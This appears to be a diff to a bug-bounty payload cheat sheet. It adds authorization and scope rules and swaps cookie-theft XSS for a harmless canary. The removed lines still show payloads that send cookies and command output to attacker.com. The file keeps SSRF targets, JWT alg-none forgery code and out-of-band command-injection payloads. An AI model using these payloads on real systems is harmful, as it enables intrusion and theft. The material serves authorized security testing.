@@ -35,6 +35,10 @@ Payloads, bypass tables, wordlists, and submission rules.
 
 ---
 
+## Payload boundaries
+
+These are parser/context-specific candidate fixtures, not guaranteed working exploits. Agree on exact hosts/accounts, attempt budget, request rate and stop conditions. Use owned synthetic records and authorized callback receivers; no live secret extraction, arbitrary resource claims or real-user request interception. Metadata/XXE/file payloads require explicit data-access scope; prefer a pre-positioned harmless canary. Smuggling can affect unrelated sessions and needs an isolated lab or specifically approved test window. Linked tools/patterns/wordlists are not bundled.
+
 ## XSS PAYLOADS
 
 ### Basic Probes
@@ -47,17 +51,16 @@ Payloads, bypass tables, wordlists, and submission rules.
 javascript:alert(document.domain)
 ```
 
-### Cookie Theft (proof of impact)
-```javascript
-<script>document.location='https://attacker.com/c?c='+document.cookie</script>
-<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
-<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
+### Non-sensitive proof of execution
+```html
+<script>document.documentElement.dataset.authorizedCanary = 'unique-test-id'</script>
 ```
+Use a unique canary in an owned test session. Do not collect live cookies or tokens. HttpOnly cookies cannot be read with document.cookie; script execution alone does not prove account takeover.
 
 ### CSP Bypass Techniques
 ```javascript
-// If unsafe-inline blocked — use fetch/XHR
-<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
+// fetch does not bypass script-src: an inline onerror remains blocked.
+// connect-src also governs fetch destinations. Test an authorized canary under the real policy.
 
 // If script-src nonce present — find nonce reflection
 <script nonce="NONCE_FROM_PAGE">alert(1)</script>
@@ -127,7 +130,7 @@ http://localhost:9200      # Elasticsearch (/_cat/indices)
 http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
 http://localhost:8080      # Admin panel
 http://localhost:2375      # Docker API — GET /containers/json
-http://localhost:10.96.0.1:443  # Kubernetes API server
+https://10.96.0.1:443  # Kubernetes API server
 ```
 
 ### SSRF IP Bypass Payloads
@@ -291,8 +294,8 @@ POST /api/user/update
 # None algorithm
 # Decode JWT, change alg to "none", remove signature
 import base64, json
-header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
-payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
+header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
+payload = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
 token = f"{header}.{payload}."
 
 # Secret bruteforce
@@ -303,11 +306,11 @@ hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
 ```bash
 # Missing PKCE test
 GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
-# No code_challenge → check if 302 (not error) = PKCE not enforced
+# Code issuance alone is not a PKCE bypass; validate token exchange enforcement for that client.
 
 # State parameter check
 GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
-# Missing/static state parameter = CSRF on OAuth = account linkage attack
+# Missing state alone is not proof: PKCE/OIDC mechanisms may provide CSRF protection; demonstrate a cross-session action with owned accounts.
 ```
 
 ---
@@ -371,7 +374,7 @@ $(sleep 5)
 ; nslookup attacker.burpcollaborator.net
 $(nslookup attacker.burpcollaborator.net)
 `ping -c 1 attacker.burpcollaborator.net`
-; wget https://attacker.com/$(id|base64)
+; curl https://authorized-canary.example/unique-test-id  # no command-output exfiltration
 ```
 
 ### Bypass Techniques
